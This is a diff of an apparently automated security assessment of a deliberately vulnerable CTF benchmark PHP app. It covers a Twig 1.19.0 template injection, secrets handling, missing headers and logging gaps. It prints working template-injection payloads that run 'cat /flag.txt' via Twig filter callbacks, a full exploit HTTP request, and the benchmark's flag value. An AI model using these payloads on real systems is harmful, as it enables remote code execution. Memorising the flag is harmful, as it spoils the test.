+- **CSRF protection:** No CSRF token validation (though less critical without authentication)
+
+The input validation strategy demonstrates a fundamental misunderstanding of injection vulnerability classes. The developer appears to have applied a generic "sanitize user input" function without understanding the specific context (template rendering) where the input would be used.
+
+### Background Processing
+
+**This application does NOT implement background processing.** There are no asynchronous job queues, no cron jobs defined in the codebase, no message queue consumers, and no worker processes. All processing occurs synchronously within the HTTP request-response cycle.
+
+The application processes each POST request immediately, renders the template, and returns the response in a single synchronous operation. There are no scheduled tasks, no deferred execution, and no background workers that could be triggered by network requests.
+
+### Attack Surface Summary
+
+The attack surface is **minimal in scope but maximal in severity**:
+
+- **Single entry point:** POST /index.php with `name` parameter
+- **No authentication:** Entry point is publicly accessible
+- **Critical vulnerability:** Server-Side Template Injection leading to Remote Code Execution
+- **No defense-in-depth:** Single failed validation mechanism, no WAF, no security headers, no sandboxing
+- **High-value target:** Flag stored in accessible filesystem location (`/flag.txt`)
+
+The attack surface analysis reveals that while the application is architecturally simple, it is fundamentally and catastrophically insecure. The single entry point contains a critical RCE vulnerability that is immediately exploitable by unauthenticated attackers, making this application completely compromised from a security standpoint.
+
+## 6. Infrastructure & Operational Security
+
+### Secrets Management
+
+The application demonstrates **critically insecure secret management practices**, particularly in the handling of the CTF flag. The flag is passed as a Docker build argument and written to the filesystem in plain text, violating multiple security best practices.
+
+**Flag Storage Mechanism:**
+
+**Location:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` (lines 30-31)
+
+```dockerfile
+ARG FLAG 
+RUN echo $FLAG > /flag.txt
+```
+
+**Security Issues:**
+
+1. **Build Argument Exposure:** Docker build arguments (`ARG`) are stored in the image metadata and layer history. Anyone with access to the image can inspect the build arguments using `docker history <image>` or by examining the image layers with tools like `dive`. This means the flag value is permanently embedded in the image metadata, not just the filesystem.
+
+2. **Plain Text Storage:** The flag is written to `/flag.txt` as plain text without encryption, encoding, or obfuscation. Any process with filesystem read access can retrieve the flag.
+
+3. **No Access Controls:** The file is created during the Docker build process running as root, then later the application runs as `www-data`. The file permissions default to readable by the web server user, making it accessible to the PHP application (and thus to attackers exploiting the SSTI vulnerability).
+
+4. **No Rotation:** The flag is static and baked into the image. There is no mechanism for flag rotation or dynamic secret injection at container startup.
+
+5. **No Secret Management System:** The application does not use environment variables for runtime secret injection, does not integrate with secret management systems (HashiCorp Vault, AWS Secrets Manager, Kubernetes Secrets), and does not implement any secure secret retrieval mechanism.
+
+**Proper Secret Management:**
+
+Secure alternatives would include:
+- Passing the flag as an environment variable at container runtime (not build time): `docker run -e FLAG=<value>`
+- Using Docker secrets (in Swarm mode): `docker secret create flag <value>`
+- Using Kubernetes secrets (in Kubernetes deployments): mounted as files or environment variables
+- Using a dedicated secret management service with dynamic secret retrieval at application startup
+
+**Environment Variables in Source Code:**
+
+The application does not use environment variables in its PHP code. There are no calls to `getenv()`, `$_ENV`, or `$_SERVER` for secret retrieval (aside from the standard `$_SERVER['REQUEST_METHOD']` for HTTP method detection). All secrets are expected to be present in the filesystem.
+
+### Configuration Security
+
+The application's configuration demonstrates **multiple security failures** across Docker, Apache, and PHP layers.
+
+**Docker Configuration Issues:**
+
+**File:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile`
+
+1. **Insecure Composer Audit (Line 25):**
+   ```dockerfile
+   RUN composer config --no-interaction audit.block-insecure false && composer install --no-interaction
+   ```
+   This disables Composer's security audit warnings, preventing detection of vulnerable dependencies. Composer would normally warn that Twig 1.19.0 (from 2015) is outdated and potentially insecure, but this configuration suppresses those warnings.
+
+2. **User Switching Security (Lines 18-28):**
+   ```dockerfile
+   USER appuser
+   RUN composer config --no-interaction audit.block-insecure false && composer install --no-interaction
+   USER root
+   RUN chown -R www-data:www-data /var/www/html/vendor
+   ```
+   The Dockerfile switches from `appuser` to `root` and back, creating unnecessary privilege escalation opportunities. Best practice would be to perform all setup as root and then switch to `www-data` once without reverting.
+
+3. **No Image Scanning:** The Dockerfile does not include any vulnerability scanning steps, security hardening, or compliance checks. There are no tools like `trivy`, `grype`, or `snyk` integrated into the build process.
+
+**Apache Configuration Issues:**
+
+**File:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf`
+
+The Apache VirtualHost configuration is minimal and lacks **all security headers**:
+
+```apache
+<VirtualHost *:8080>
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+```
+
+**Missing Security Headers:**
+
+No security headers are configured in Apache or added via PHP's `header()` function. Critical missing headers include:
+
+1. **Strict-Transport-Security (HSTS):** Not configured. The application runs on HTTP (port 8080), not HTTPS, so HSTS is not applicable in the current deployment. However, if this were deployed with HTTPS, HSTS would be essential to prevent protocol downgrade attacks.
+
+2. **Content-Security-Policy (CSP):** Not configured. A CSP header could mitigate some template injection impacts by restricting script execution, though it would not prevent server-side code execution. A proper CSP would be: `Content-Security-Policy: default-src 'self'; script-src 'none'; object-src 'none';`
+
+3. **X-Frame-Options:** Not configured. This header prevents clickjacking attacks by controlling whether the page can be embedded in iframes. Should be set to: `X-Frame-Options: DENY`
+
+4. **X-Content-Type-Options:** Not configured. This header prevents MIME-sniffing attacks. Should be set to: `X-Content-Type-Options: nosniff`
+
+5. **Referrer-Policy:** Not configured. This controls information leakage via the Referer header. Should be set to: `Referrer-Policy: no-referrer` or `strict-origin-when-cross-origin`
+
+6. **Permissions-Policy:** Not configured. This controls browser feature access (camera, microphone, geolocation, etc.)
+
+7. **Cache-Control:** Not configured for security-sensitive responses. Should be set to: `Cache-Control: no-store, no-cache, must-revalidate, private` for pages containing sensitive data.
+
+**Infrastructure Configuration Search Results:**
+
+No Nginx configurations, Kubernetes Ingress resources, or CDN settings were found. The application uses only Apache as configured in the Dockerfile, with no additional reverse proxies, load balancers, or edge security layers.
+
+**PHP Configuration Issues:**
+
+**File:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (lines 16-24)
+
+```php
+$twig = new Twig_Environment($loader, [
+    'debug' => true,              // DANGEROUS: Debug mode enabled in production
+    'charset' => 'UTF-8',
+    'base_template_class' => 'Twig_Template',
+    'auto_reload' => true,        // Template reloading enabled
+    'strict_variables' => false,  // Suppresses undefined variable errors
+    'autoescape' => 'html',       // HTML escaping enabled (but ineffective against SSTI)
+    'optimizations' => 0,         // Optimizations disabled
+]);
+```
+
+**Security Issues:**
+
+- **Debug Mode Enabled:** `'debug' => true'` exposes detailed error messages and stack traces that aid exploitation
+- **Auto-Reload Enabled:** `'auto_reload' => true'` forces Twig to check template modification times on every request, reducing performance and potentially enabling timing attacks
+- **No Optimizations:** `'optimizations' => 0'` disables all performance optimizations, though this has minimal security impact
+
+### External Dependencies
+
+The application depends on a **single external library**: Twig 1.19.0, installed via Composer.
+
+**Dependency Manifest:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/composer.json`
+
+```json
+{
+  "require": {
+    "twig/twig": "1.19.0"
+  }
+}
+```
+
+**Dependency Security Analysis:**
+
+1. **Twig 1.19.0 (July 2015 - End of Life):**
+   - Released over 8 years ago
+   - No longer receives security updates
+   - Contains known vulnerabilities and sandbox bypass techniques
+   - Current version (as of 2025) is Twig 3.x, representing multiple major version upgrades of security improvements
+   - The specific version is pinned exactly (`1.19.0` rather than `^1.19` or `~1.19`), ensuring consistent exploitation
+
+2. **No Dependency Integrity Verification:**
+   - No `composer.lock` file validation in the deployment process
+   - No integrity checks or checksum verification
+   - Composer audit explicitly disabled: `composer config audit.block-insecure false`
+
+3. **Supply Chain Risk:**
+   - Dependencies are fetched from Packagist (the default Composer repository) without signature verification
+   - No software composition analysis (SCA) tools are used
+   - No bill of materials (SBOM) generation
+
+**Third-Party Service Dependencies:**
+
+The application has **NO external service dependencies**. It does not integrate with:
+- Authentication providers (OAuth, SAML, LDAP)
+- Payment processors (Stripe, PayPal)
+- Email services (SendGrid, Mailgun)
+- Analytics platforms (Google Analytics, Mixpanel)
+- Monitoring services (Sentry, DataDog)
+- Cloud storage services (AWS S3, Google Cloud Storage)
+- CDN providers (Cloudflare, Fastly)
+
+This isolation eliminates supply chain risks from third-party service compromises but also means there is no external monitoring, alerting, or incident detection capability.
+
+### Monitoring & Logging
+
+The application implements **minimal logging** with no custom application-level logging, security event monitoring, or intrusion detection.
+
+**Apache Access Logging:**
+
+**Configuration:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf` (lines 20-21)
+
+```apache
+ErrorLog ${APACHE_LOG_DIR}/error.log
+CustomLog ${APACHE_LOG_DIR}/access.log combined
+```
+
+**What Is Logged:**
+- **Access Log:** All HTTP requests in Apache's "combined" format, which includes: client IP, timestamp, request method/URI/protocol, status code, response size, Referer header, User-Agent header
+- **Error Log:** PHP errors, Apache errors, and stack traces (especially verbose because Twig debug mode is enabled)
+
+**What Is NOT Logged:**
+- Request bodies (the malicious `name` parameter payload would not appear in standard access logs)
+- Template injection attempts or exploitation indicators
+- File access patterns (reading `/flag.txt`)
+- Command execution events
+- Authentication attempts (not applicable - no authentication system)
+- Security policy violations (not applicable - no security policies enforced)
+
+**Security Event Visibility:**
+
+The logging configuration provides **minimal security event visibility**:
+
+1. **Successful SSTI Exploitation:** An attacker exploiting the template injection vulnerability would appear in access logs as a normal POST request to `/index.php`. The malicious payload in the `name` parameter would not be logged unless Apache is configured with verbose request body logging (which it is not).
+
+2. **Flag Retrieval:** If an attacker uses SSTI to read `/flag.txt`, this file access would not appear in Apache logs (filesystem access is not logged by Apache). The command execution would also not be logged.
+
+3. **Error Disclosure:** With Twig debug mode enabled, detailed error messages and stack traces would appear in both the HTTP response and the error log, aiding attackers in refining their exploits.
+
+**Missing Monitoring Capabilities:**
+
+- **Application Performance Monitoring (APM):** No APM integration (New Relic, DataDog, Dynatrace)
+- **Security Information and Event Management (SIEM):** No SIEM integration for security event correlation
+- **Intrusion Detection System (IDS):** No IDS/IPS monitoring for attack patterns
+- **File Integrity Monitoring (FIM):** No monitoring of `/flag.txt` access or modification
+- **Runtime Application Self-Protection (RASP):** No RASP agents detecting exploitation attempts
+
+The absence of comprehensive monitoring means that successful exploitation would likely go undetected in real-time. An attacker could exploit the SSTI vulnerability, retrieve the flag, and exfiltrate it without triggering any security alerts beyond a generic HTTP POST request appearing in standard access logs.
+
+## 7. Overall Codebase Indexing
+
+The XBEN-044-24 application codebase is deliberately minimal, consisting of a **single 75-line PHP entry point** supported by a small set of configuration files and Docker infrastructure. The repository follows a **vendor-based dependency structure** where the Twig template engine (approximately 5,982 lines of third-party code) resides in the `/vendor/twig/twig/` directory, managed by Composer.
+
+The directory organization reflects a **monolithic single-purpose application** rather than a structured MVC or layered architecture. The primary application code resides in `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/`, which contains the `index.php` entry point, configuration files, templates, and vendor dependencies. The application uses a **flat file structure** with no separation of concerns into controllers, models, views, or services. All business logic, template rendering, and HTTP handling exist in a single procedural PHP file.
+
+Build orchestration is handled by **Docker and Composer**. The `Dockerfile` defines a multi-stage container build process that installs system dependencies (zip, unzip, git, pdo_mysql), installs Composer, configures the PHP environment, and sets up the Apache web server. The Composer dependency manager uses a minimalist `composer.json` with a single dependency (Twig 1.19.0), demonstrating that this is a purpose-built CTF challenge rather than a production application framework. The build process explicitly disables Composer's security auditing with `composer config audit.block-insecure false`, allowing the installation of the outdated and vulnerable Twig version without warnings.
+
+The Apache web server configuration is split across two files in `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/`: `000-default.conf` defines the VirtualHost for port 8080, and `ports.conf` configures Apache to listen on ports 8080 (HTTP) and 443 (HTTPS, though TLS is not actually configured). The template directory `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/templates/` contains a single Twig template file (`hello.html.twig`) that demonstrates a Server-Side Template Injection payload but is not actively rendered by the main application flow (line 52 of `index.php` is commented out).
+
+The **vendor directory structure** follows Composer's standard conventions: `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/vendor/composer/` contains autoloading configuration and installed package metadata, while `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/vendor/twig/twig/` contains the complete Twig 1.19.0 library source code. The Twig library includes extensive subdirectories for core functionality (`/lib/Twig/`), documentation (`/doc/`), tests (`/test/`), and C extension source code (`/ext/`), though only the core library files are relevant for security analysis. The Twig Sandbox extension components (`Sandbox.php`, `SecurityPolicy.php`, `NodeVisitor/Sandbox.php`) are present in the vendor directory but are explicitly removed at runtime by the application code, eliminating their security protections.
+
+From a **discoverability perspective**, the simple flat structure makes it trivial to identify all security-relevant components: there is exactly one entry point (`index.php`), exactly one template file (`hello.html.twig`), and exactly one set of configuration files (Dockerfile, Apache configs, composer.json). The absence of a complex directory hierarchy, routing configuration, or layered architecture means there are no hidden endpoints, no obscure middleware chains, and no complex attack surfaces to enumerate. However, this simplicity is deceptive—while the application is easy to understand architecturally, the single entry point contains a catastrophic vulnerability that grants complete remote code execution.
+
+The repository also includes **CTF challenge metadata** in the parent directory structure: `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/Makefile` contains build commands for Docker Compose orchestration, `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/docker-compose.yml` defines the container deployment configuration, `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/.env` stores the FLAG value as an environment variable, and `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/benchmark.json` contains challenge metadata (difficulty, category, description). These files are **out of scope** for network-based attacks (they are local build tools and configuration), but they provide valuable intelligence about the challenge structure and the intended exploitation path.
+
+The codebase organization reveals that this is a **deliberately vulnerable training application** designed to teach Server-Side Template Injection concepts. The minimal structure ensures that pentesters can quickly identify the vulnerability without getting distracted by architectural complexity, while the intentional security failures (Sandbox removal, inadequate input validation, debug mode enabled) create a clear exploitation path from template injection to remote code execution to flag retrieval.
+
+## 8. Critical File Paths
+
+The following file paths are referenced throughout this security analysis, categorized by their security relevance for downstream manual review:
+
+### Configuration
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` - Container configuration with flag storage, user switching, and Composer security audit bypass
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/docker-compose.yml` - Container orchestration configuration (out of scope for network attacks)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf` - Apache VirtualHost configuration with missing security headers
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/ports.conf` - Apache port configuration (8080 HTTP, 443 HTTPS)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/.env` - Environment variable file containing FLAG value
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/Makefile` - Build automation (out of scope for network attacks)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/benchmark.json` - CTF challenge metadata
+
+### Authentication & Authorization
+
+- **NONE** - Application implements no authentication or authorization mechanisms
+
+### API & Routing
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` - Primary and only network-accessible entry point (POST /index.php with SSTI vulnerability)
+
+### Data Models & DB Interaction
+
+- **NONE** - Application does not use a database
+
+### Dependency Manifests
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/composer.json` - PHP dependency declaration (Twig 1.19.0)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/vendor/composer/installed.json` - Installed package metadata
+
+### Sensitive Data & Secrets Handling
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` (lines 30-31) - FLAG stored in /flag.txt
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/.env` (line 1) - FLAG environment variable definition
+
+### Middleware & Input Validation
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (line 8) - htmlspecialchars() input validation (inadequate for SSTI)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (lines 36-43) - Twig Sandbox extension removal code
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Extension/Sandbox.php` - Twig Sandbox extension (removed at runtime)
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Sandbox/SecurityPolicy.php` - Twig security policy definition
+
+### Logging & Monitoring
+
+- **Apache logs configured but no application-level logging** - Standard access.log and error.log configured in 000-default.conf (lines 20-21)
+
+### Infrastructure & Deployment
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` - Complete container build definition
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/docker-compose.yml` - Container orchestration
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/000-default.conf` - Apache VirtualHost
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/wwwconf/ports.conf` - Apache port configuration
+
+### CTF Flag Storage
+
+- **Container Filesystem:** `/flag.txt` (created at runtime by Dockerfile ARG FLAG and RUN echo command)
+- **Dockerfile:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/Dockerfile` (lines 30-31)
+- **Environment Variable Source:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/.env` (line 1)
+
+### Templates & SSTI Vulnerabilities
+
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (line 56) - Critical SSTI vulnerability in $twig->render() call
+- `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/templates/hello.html.twig` (line 8) - Template file with embedded RCE payload demonstration
+
+## 9. XSS Sinks and Render Contexts
+
+Based on comprehensive analysis of the network-accessible application code, **TWO CRITICAL TEMPLATE INJECTION SINKS** were identified that enable Server-Side Template Injection (SSTI) leading to Remote Code Execution. While these are technically Server-Side Template Injection vulnerabilities rather than traditional client-side XSS, they are included here as they represent dangerous sinks where user input is rendered in an executable context.
+
+### SINK #1: Critical Server-Side Template Injection (SSTI) in Twig Render Call
+
+**Sink Type:** Template Injection / Remote Code Execution
+
+**Render Context:** Server-Side Template Engine (Twig 1.19.0) - This is NOT a browser-side XSS sink but a server-side code execution sink that operates during template rendering before HTML is sent to the browser.
+
+**Function/Method:** `Twig_Environment->render()` with user-controlled template string
+
+**File Location:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` - **Line 56**
+
+**Code Context:**
+
+```php
+// Line 8: User input from POST parameter with inadequate sanitization
 $name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : ' default';
 
-// Line 55-58: POST Handler
+// Lines 16-24: Twig environment configuration
+$twig = new Twig_Environment($loader, [
+    'debug' => true,
+    'charset' => 'UTF-8',
+    'base_template_class' => 'Twig_Template',
+    'auto_reload' => true,
+    'strict_variables' => false,
+    'autoescape' => 'html',       // HTML escaping, but ineffective against template injection
+    'optimizations' => 0,
+]);
+
+// Lines 36-43: CRITICAL - Sandbox extension explicitly removed
+foreach ($twig->getExtensions() as $extname => $extension) {
+    $extensionsInfo[] = $extname;
+    if ($extension instanceof Twig_Extension_Sandbox) {
+       $twig->removeExtension($extname);  // Removes security restrictions
+    }
+}
+
+// Line 56: CRITICAL VULNERABILITY - User input concatenated into template string
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {    
     echo $twig->render('<strong>' .  $name . ' is in stock! Come back and test another one. </strong>') . '<br/>Twig version: ' . $twig->render($twigVersion);    
     echo '<br/>Loaded extension: ' . implode(', ', $extensionsInfo) . '<br/>';
@@ -350,969 +638,312 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ```
 
-**Vulnerability Analysis:**
-- **SSTI Vulnerability:** User input concatenated into Twig template string (line 56)
-- **Template Loader:** Uses deprecated `Twig_Loader_String` (line 12)
-- **Sandbox Disabled:** Explicitly removed on lines 40-42
-- **Debug Mode:** Enabled (line 17), exposes internal errors
-- **Information Disclosure:** Displays Twig version and loaded extensions (lines 56-57)
+**User Input Source:** `$_POST['name']` from HTML form submission
 
-**Exploitation Path:**
-1. Send POST request with `name` parameter containing Twig expression syntax
-2. `htmlspecialchars()` encodes HTML special chars but leaves `{{`, `}}` intact
-3. Twig_Loader_String treats the concatenated string as template source code
-4. Twig evaluates expressions like `{{7*7}}` or `{{_self.env.registerUndefinedFilterCallback("system")}}`
-5. Achieve Remote Code Execution as `www-data` user
-6. Read `/flag.txt` or execute arbitrary system commands
+**Data Flow Path:**
 
-**Attack Surface Metrics:**
-- **Attack Complexity:** LOW - Direct exploitation via single POST parameter
-- **Privileges Required:** NONE - No authentication
-- **User Interaction:** NONE - Fully automated exploitation
-- **Scope:** CHANGED - RCE breaks out of application context
-
-### Internal Service Communication
-
-**Status: NOT APPLICABLE**
-
-This is a monolithic single-file application with no internal service-to-service communication. There are:
-- No microservices architecture
-- No internal APIs
-- No service mesh
-- No inter-process communication mechanisms
-- No message queues or pub/sub systems
-
-### Input Validation Patterns
-
-**Validation Mechanisms:**
-
-The application implements only minimal input validation:
-
-1. **Existence Check:** `isset($_POST['name'])` verifies parameter presence
-2. **HTML Encoding:** `htmlspecialchars()` encodes `<`, `>`, `&`, `"`, `'` (line 8)
-
-**Missing Validation:**
-- ❌ **Length limits** - Accepts unlimited input size
-- ❌ **Character whitelisting** - No allowed character set enforcement
-- ❌ **Type checking** - No validation that input is a string
-- ❌ **Format validation** - No regex or pattern matching
-- ❌ **Business logic validation** - No semantic validation of input meaning
-- ❌ **Template syntax blocking** - Twig delimiters (`{{`, `}}`, `{%`, `%}`) not filtered
-- ❌ **Dangerous character filtering** - No blacklist for `.`, `_`, `()`, `[]`
+1. User submits POST request with `name` parameter containing malicious Twig payload
+2. `$_POST['name']` is passed through `htmlspecialchars()` which only escapes HTML entities (`<`, `>`, `&`, `"`, `'`)
+3. Twig syntax delimiters (`{{`, `}}`, `{%`, `%}`, `{#`, `#}`) are NOT escaped by `htmlspecialchars()`
+4. The "sanitized" but still dangerous `$name` variable is concatenated into a string: `'<strong>' . $name . ' is in stock! ...'`
+5. This concatenated string is passed to `$twig->render()` as a template to be executed
+6. Twig parses the string, identifies Twig syntax, and executes any expressions found
+7. With Sandbox extension removed (lines 36-43), there are no restrictions on Twig operations
 
 **Why htmlspecialchars() Fails:**
 
-`htmlspecialchars()` only encodes HTML special characters:
-- `<` → `&lt;`
-- `>` → `&gt;`
-- `&` → `&amp;`
-- `"` → `&quot;`
-- `'` → `&#039;`
+The `htmlspecialchars()` function is designed to prevent XSS by converting HTML metacharacters to HTML entities. However, it does not escape Twig template syntax. An attacker can inject Twig expressions like:
 
-**Twig template syntax remains unaffected:**
-- `{{` - Expression delimiter (NOT encoded)
-- `}}` - Expression delimiter (NOT encoded)
-- `{%` - Statement delimiter (NOT encoded)
-- `%}` - Statement delimiter (NOT encoded)
-- `_self`, `.env`, method calls - All pass through unchanged
+- `{{7*7}}` - Simple expression injection (renders as `49`)
+- `{{_self.env.registerUndefinedFilterCallback("exec")}}` - Registers PHP `exec()` function as a filter
+- `{{_self.env.getFilter("cat /flag.txt")}}` - Executes shell command via registered filter
 
-**Proof of Bypass:**
-```bash
-Input:  {{7*7}}
-After htmlspecialchars():  {{7*7}}  (unchanged)
-After Twig render:  49  (expression evaluated)
+These payloads pass through `htmlspecialchars()` unchanged because `{`, `}`, `_`, `.`, and alphanumeric characters are not HTML special characters.
+
+**Scope Status:** **IN-SCOPE: Network-accessible** - This vulnerability is exploitable via HTTP POST to `http://<server>:8080/index.php`
+
+**Severity:** **CRITICAL** - Allows unauthenticated remote code execution
+
+**Exploitation Example:**
+
+```http
+POST /index.php HTTP/1.1
+Host: target.example.com:8080
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag.txt")}}
 ```
 
-### Background Processing
+**Response (containing flag):**
 
-**Status: NOT APPLICABLE**
-
-The application has no background job processing:
-- No async workers
-- No cron jobs
-- No scheduled tasks
-- No message queue consumers
-- No webhook processors (beyond the single synchronous endpoint)
-
-All request processing is synchronous within the Apache/PHP-FPM request-response cycle.
-
-### Out-of-Scope Components (Excluded)
-
-The following components are **NOT network-accessible** and are excluded from attack surface analysis:
-
-**Build & Development Tools:**
-- Composer (`/usr/bin/composer`) - Package manager, CLI only
-- Makefile - Build automation, requires local shell access
-- docker-compose.yml - Infrastructure definition, not an endpoint
-
-**Vendor Libraries:**
-- All files under `/app/vendor/` - Third-party library code
-- Twig test suite (`/app/vendor/twig/twig/test/*`) - Not served by web server
-- Composer autoloader files - Not directly accessible
-
-**Static Configuration:**
-- Apache configuration files (`.conf`) - Server configuration only
-- Environment files (`.env`) - Build-time variables, not served
-
-**Unused Templates:**
-- `/app/templates/hello.html.twig` - Contains RCE payload but is **NOT loaded** by the application (commented out on line 11 of index.php)
-
----
-
-## 6. Infrastructure & Operational Security
-
-### Secrets Management
-
-**Status: INSECURE**
-
-**Critical Finding:** The CTF flag is stored in multiple plaintext locations with no encryption or access controls.
-
-**Secret Storage Locations:**
-
-1. **Environment File** (`.env`):
-   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/.env` (line 1)
-   - **Content:** `FLAG="flag{af836647-517f-415a-a0a8-90b9bd2115e7}"`
-   - **Risk:** Plaintext storage, committed to source control
-   - **Access:** Readable by anyone with file system access
-
-2. **Dockerfile Build Argument**:
-   - **File:** `/app/Dockerfile` (lines 30-31)
-   - **Content:** 
-     ```dockerfile
-     ARG FLAG 
-     RUN echo $FLAG > /flag.txt
-     ```
-   - **Risk:** Flag visible in Docker image history (`docker history` command)
-   - **Access:** Anyone with access to the Docker image
-
-3. **Container Filesystem**:
-   - **File:** `/flag.txt` (inside container)
-   - **Permissions:** World-readable
-   - **Owner:** `root`
-   - **Risk:** Accessible to `www-data` user (application runtime user)
-   - **Access:** Can be read via RCE through SSTI vulnerability
-
-**Secret Management Gaps:**
-- ❌ **No encryption** - Secrets stored in plaintext
-- ❌ **No secret management service** - No HashiCorp Vault, AWS Secrets Manager, etc.
-- ❌ **No Docker secrets** - Not using Docker swarm secrets mechanism
-- ❌ **No secret rotation** - Static flag value never changes
-- ❌ **No access logging** - No audit trail of secret access
-
-### Configuration Security
-
-**Environment Separation:** NOT IMPLEMENTED
-
-The application has no environment-specific configuration:
-- No distinction between dev/staging/production
-- Same `.env` file for all environments
-- No environment variable override mechanism
-
-**Configuration Files:**
-
-1. **Apache Virtual Host** (`/app/wwwconf/000-default.conf`):
-   - **Port:** 8080 (non-standard HTTP port)
-   - **Document Root:** `/var/www/html`
-   - **No security headers configured:**
-     - ❌ Missing: `Content-Security-Policy`
-     - ❌ Missing: `X-Frame-Options`
-     - ❌ Missing: `X-Content-Type-Options`
-     - ❌ Missing: `Strict-Transport-Security` (HSTS)
-     - ❌ Missing: `Referrer-Policy`
-     - ❌ Missing: `Permissions-Policy`
-
-2. **Apache Ports** (`/app/wwwconf/ports.conf`):
-   - **Listen Port:** 8080 (line 5)
-   - **No SSL/TLS configuration** - HTTP only
-
-**Infrastructure Configuration (Nginx/CDN/Ingress):**
-
-**Finding:** No infrastructure-level security headers or advanced configurations detected.
-
-- **No Nginx reverse proxy** - Direct Apache exposure
-- **No CDN** - No CloudFlare, Cloudfront, or similar
-- **No Kubernetes Ingress** - Not deployed in Kubernetes
-- **No WAF** - No Web Application Firewall
-- **No rate limiting** - No request throttling at infrastructure level
-
-**Cache-Control Headers:** NOT CONFIGURED
-
-No cache control headers are set by the application or web server, meaning:
-- Browsers may cache sensitive responses
-- No explicit `no-store` directive for sensitive data
-- No cache validation mechanisms
-
-### External Dependencies
-
-**Third-Party Services:** NONE
-
-The application has no external service dependencies:
-- No payment gateways
-- No OAuth providers
-- No email services
-- No SMS/notification services
-- No analytics platforms
-- No CDN services
-- No external APIs
-
-**Third-Party Libraries:**
-
-**Direct Dependency:**
-- **Twig 1.19.0** (defined in `composer.json`)
-  - **Vendor:** Fabien Potencier / Symfony Project
-  - **License:** BSD-3-Clause
-  - **Release Date:** July 31, 2015 (9+ years old)
-  - **Security Status:** ⚠️ **CRITICAL VULNERABILITIES KNOWN**
-  - **Known CVEs:** CVE-2022-39261 (SSTI in Twig < 2.15.3), multiple sandbox escape vulnerabilities in 1.x
-  - **Support Status:** End-of-Life (EOL) - No security updates
-
-**Transitive Dependencies:** NONE - Only Twig is installed
-
-**Security Implication:** The application's sole dependency is a critically outdated and vulnerable version of Twig. Modern Twig versions (3.x) include:
-- Removed `Twig_Loader_String` (deprecated as dangerous)
-- Enhanced sandbox enforcement
-- Better SSTI protections
-- Security patches for known vulnerabilities
-
-### Monitoring & Logging
-
-**Application-Level Logging:** MINIMAL
-
-The application has debug mode enabled but no comprehensive logging:
-
-**Debug Mode Configuration:**
-- **Location:** `/app/index.php` line 17
-- **Setting:** `'debug' => true`
-- **Impact:** 
-  - ⚠️ Exposes detailed error messages to end users
-  - ⚠️ Reveals file paths and code structure
-  - ⚠️ Shows Twig template compilation errors
-  - ⚠️ Information disclosure vulnerability
-
-**Web Server Logging (Apache):**
-- **Access Log:** `${APACHE_LOG_DIR}/access.log` (configured in `000-default.conf` line 21)
-- **Error Log:** `${APACHE_LOG_DIR}/error.log` (line 20)
-- **Format:** Combined log format (includes referrer, user agent)
